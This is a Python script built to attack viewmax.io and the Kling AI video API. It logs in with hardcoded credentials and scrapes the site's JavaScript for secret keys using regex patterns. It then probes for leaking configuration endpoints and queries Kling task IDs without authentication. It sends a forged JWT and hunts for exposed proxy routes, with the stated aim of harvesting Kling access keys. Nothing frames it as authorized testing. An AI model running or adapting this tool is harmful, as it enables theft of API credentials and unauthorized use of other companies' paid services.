"""
Target: Kling AI API directly.
1. Scrape ALL JS chunks from authenticated dashboard pages (more code = more keys)
2. Probe Kling's API with viewmax's task IDs to fingerprint auth requirements
3. Check Vercel config leak endpoints
4. Try to forge a Kling JWT (if we can guess access_key format)
5. Check if Kling has any unauthenticated endpoints
"""
import asyncio, aiohttp, re, json, hashlib, hmac, base64, time

EMAIL    = "quicken-jolt-crave@duck.com"
PASSWORD = "quicken-jolt-crave@duck.com"
BASE     = "https://www.viewmax.io"
KLING    = "https://api.klingai.com"

HDRS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Accept":          "application/json",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type":    "application/json",
    "Origin":          BASE,
    "Referer":         BASE + "/",
}
PAGE_HDRS = {**HDRS, "Accept": "text/html,application/xhtml+xml,*/*"}

KEY_PATTERNS = [
    (r'KLING[_A-Z0-9]*\s*[=:]\s*["\']([^"\']{10,})["\']', "KLING_KEY"),
    (r'klingAccessKey["\s]*[:=]["\s]*["\']([^"\']{10,})["\']', "KLING_ACCESS_KEY"),
    (r'klingSecretKey["\s]*[:=]["\s]*["\']([^"\']{10,})["\']', "KLING_SECRET_KEY"),
    (r'access[_\-]?key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{16,})["\']', "ACCESS_KEY"),
    (r'secret[_\-]?key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{16,})["\']', "SECRET_KEY"),
    (r'api[_\-]?key["\s]*[:=]["\s]*["\']([A-Za-z0-9_\-]{16,})["\']', "API_KEY"),
    (r'Authorization["\s]*[:=]["\s]*["\']Bearer\s+([A-Za-z0-9_\-\.]{20,})["\']', "BEARER"),
    (r'process\.env\.([A-Z_]{3,50})', "ENV_VAR_NAME"),
    (r'eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}', "JWT"),
    (r'klingai\.com[^\s"\'<>]{0,120}', "KLING_URL"),
    (r'"(/v\d+/videos/[^"]{0,60})"', "KLING_ENDPOINT"),
    (r"'(/v\d+/videos/[^']{0,60})'", "KLING_ENDPOINT"),
    (r'runyuan|klingai|kuaishou|kwai', "KLING_BRAND"),
]

seen_chunks = set()
all_findings = {}
all_api_paths = set()
all_env_vars = set()


async def login(s):
    async with s.post(f"{BASE}/api/auth/sign-in/email",
                      json={"email": EMAIL, "password": PASSWORD, "rememberMe": True},
                      headers=HDRS) as r:
        return await r.json()


async def scan_chunk(s, url):
    if url in seen_chunks:
        return
    seen_chunks.add(url)
    try:
        async with s.get(url, headers=PAGE_HDRS, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return
            text = await r.text()
    except Exception:
        return

    name = url.split("/")[-1][:35]

    for pat, label in KEY_PATTERNS:
        matches = re.findall(pat, text, re.IGNORECASE)
        if matches:
            unique = list(dict.fromkeys(m if isinstance(m, str) else m for m in matches))
            if label == "ENV_VAR_NAME":
                for v in unique:
                    all_env_vars.add(v)
            elif label in ("KLING_BRAND",):
                # Just note presence
                if unique:
                    all_findings.setdefault(label, set()).add(name)
            else:
                for v in unique[:5]:
                    key = (label, v[:80])
                    if key not in all_findings.get("_seen", set()):
                        all_findings.setdefault("_seen", set()).add(key)
                        all_findings.setdefault(label, []).append((name, v[:120]))
                        if label != "ENV_VAR_NAME":
                            print(f"  !! [{label}] in {name}: {v[:80]}")

    # API paths
    for p in re.findall(r'["`\'](/(?:api|v\d+)/[a-zA-Z0-9/_\-\$\{\}]{2,80})["`\']', text):
        all_api_paths.add(p)


async def get_page_chunks(s, url):
    """Fetch a page and extract all script src URLs."""
    try:
        async with s.get(url, headers=PAGE_HDRS, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return []
            html = await r.text()
    except Exception:
        return []
    
    scripts = re.findall(r'src="(/_next/static/[^"]+\.js[^"]*)"', html)
    return [BASE + s for s in scripts]


async def main():
    jar = aiohttp.CookieJar(unsafe=True)
    conn = aiohttp.TCPConnector(limit=30)
    async with aiohttp.ClientSession(cookie_jar=jar, connector=conn) as s:

        print("Logging in...")
        await login(s)

        # ── Phase 1: Collect chunks from multiple authenticated pages ──
        pages_to_scrape = [
            BASE + "/",
            BASE + "/dashboard",
            BASE + "/generate",
            BASE + "/credits",
            BASE + "/settings",
            BASE + "/profile",
            BASE + "/videos",
            BASE + "/ai-video",
        ]

        print(f"\n── Phase 1: Scraping JS from {len(pages_to_scrape)} pages ──")
        all_chunk_urls = set()
        for page in pages_to_scrape:
            chunks = await get_page_chunks(s, page)
            for c in chunks:
                all_chunk_urls.add(c)
            print(f"  {page.split('/')[-1] or 'home'}: {len(chunks)} chunks")

        print(f"\n  Total unique chunks: {len(all_chunk_urls)}")
        print(f"  Scanning all for Kling keys...\n")

        tasks = [scan_chunk(s, url) for url in all_chunk_urls]
        await asyncio.gather(*tasks)

        # ── Phase 2: Print env vars found ──
        print(f"\n── Phase 2: Environment variable names in JS ──")
        kling_envs = sorted(v for v in all_env_vars if "KLING" in v or "KLING" in v)
        other_envs = sorted(v for v in all_env_vars if "KLING" not in v and "KLING" not in v)
        print(f"  Kling-related: {kling_envs}")
        print(f"  All env vars ({len(all_env_vars)}): {sorted(all_env_vars)[:30]}")

        # ── Phase 3: Vercel leak endpoints ──
        print(f"\n── Phase 3: Vercel / Next.js leak endpoints ──")
        leak_paths = [
            "/_vercel/speed-insights/script.js",
            "/_vercel/insights/script.js",
            "/api/env",
            "/api/config",
            "/api/debug",
            "/api/health",
            "/api/info",
            "/__nextjs_original-stack-frame",
            "/_next/data/development/index.json",
            "/api/auth/get-session",
            "/api/auth/session",
            "/api/auth/providers",
            "/api/auth/csrf",
        ]
        for path in leak_paths:
            try:
                async with s.get(BASE + path, headers=HDRS,
                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status not in (404, 405):
                        body = (await r.text())[:200].replace('\n', ' ')
                        print(f"  [{r.status}] {path} -> {body}")
            except Exception:
                pass

        # ── Phase 4: Probe Kling's API directly ──
        print(f"\n── Phase 4: Kling API direct probe ──")
        
        kling_endpoints = [
            "/v1/videos/text2video",
            "/v1/videos/image2video",
            "/v1/account/costs",
            "/v1/account/balance",
            "/v1/tasks",
            "/v1/models",
            "/v1/videos",
        ]
        
        # Try without auth first
        print("  Testing Kling API without auth:")
        for ep in kling_endpoints:
            try:
                async with s.get(KLING + ep, headers={"User-Agent": HDRS["User-Agent"]},
                                  timeout=aiohttp.ClientTimeout(total=10)) as r:
                    body = (await r.text())[:150].replace('\n', ' ')
                    print(f"    [{r.status}] GET {ep} -> {body}")
            except Exception as e:
                print(f"    [ERR] {ep} -> {e}")

        # Try to get a task by known ID without auth
        known_sora_ids = [
            "877049849609330707",
            "877048930327592962",
            "877048416370163798",
        ]
        print("\n  Fetching known task IDs from Kling API (no auth):")
        for tid in known_sora_ids[:2]:
            try:
                async with s.get(f"{KLING}/v1/videos/text2video/{tid}",
                                  headers={"User-Agent": HDRS["User-Agent"]},
                                  timeout=aiohttp.ClientTimeout(total=10)) as r:
                    body = (await r.text())[:200].replace('\n', ' ')
                    print(f"    [{r.status}] task/{tid} -> {body}")
            except Exception as e:
                print(f"    [ERR] {tid} -> {e}")

        # ── Phase 5: Kling JWT structure analysis ──
        print(f"\n── Phase 5: Kling JWT / auth analysis ──")
        print("  Kling uses HMAC-SHA256 JWT: iss=access_key, exp=now+30min")
        print("  Looking for access_key format in Kling API error messages...")
        
        # Send malformed JWT to see error structure
        fake_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0ZXN0a2V5MTIzIiwiZXhwIjoxOTk5OTk5OTk5fQ.fake"
        try:
            async with s.get(f"{KLING}/v1/videos/text2video",
                              headers={"Authorization": f"Bearer {fake_jwt}",
                                       "Content-Type": "application/json"},
                              timeout=aiohttp.ClientTimeout(total=10)) as r:
                body = (await r.text())[:300].replace('\n', ' ')
                print(f"  Fake JWT response [{r.status}]: {body}")
        except Exception as e:
            print(f"  Fake JWT error: {e}")

        # ── Phase 6: Check if viewmax leaks Kling key in request headers ──
        print(f"\n── Phase 6: Check viewmax server response headers for Kling info ──")
        async with s.get(f"{BASE}/api/me", headers=HDRS) as r:
            print(f"  /api/me response headers:")
            for k, v in r.headers.items():
                if any(x in k.lower() for x in ["kling", "x-", "cf-", "via", "server", "powered"]):
                    print(f"    {k}: {v}")

        # Check if there's a Kling proxy endpoint exposed
        print(f"\n── Phase 7: Proxy / passthrough endpoint probe ──")
        proxy_paths = [
            "/api/kling",
            "/api/kling/generate",
            "/api/kling/status",
            "/api/ai/generate",
            "/api/ai-video/generate",
            "/api/proxy/kling",
            "/api/video/create",
            "/api/generate",
        ]
        for path in proxy_paths:
            try:
                async with s.get(BASE + path, headers=HDRS,
                                  timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status != 404:
                        body = (await r.text())[:150].replace('\n', ' ')
                        print(f"  [{r.status}] {path} -> {body}")
                # Also POST
                async with s.post(BASE + path,
                                   json={"prompt": "test", "model": "kling"},
                                   headers=HDRS,
                                   timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status not in (404, 405):
                        body = (await r.text())[:150].replace('\n', ' ')
                        print(f"  [{r.status}] POST {path} -> {body}")
            except Exception:
                pass

        # ── Summary ──
        print(f"\n{'='*60}")
        print("SUMMARY")
        print(f"{'='*60}")
        for label, vals in all_findings.items():
            if label.startswith("_"):
                continue
            if isinstance(vals, set):
                print(f"[{label}]: {vals}")
            else:
                print(f"[{label}] ({len(vals)}):")
                for chunk, val in vals[:8]:
                    print(f"  {chunk}: {val}")

        print(f"\nAll API paths found ({len(all_api_paths)}):")
        for p in sorted(all_api_paths):
            print(f"  {p}")

        # Save
        with open("_kling_dig.json", "w") as f:
            json.dump({
                "env_vars": sorted(all_env_vars),
                "kling_env_vars": kling_envs,
                "api_paths": sorted(all_api_paths),
                "findings": {k: (list(v) if isinstance(v, set) else v)
                             for k, v in all_findings.items() if not k.startswith("_")}
            }, f, indent=2, default=str)
        print("\nSaved to _kling_dig.json")


asyncio.run(main())
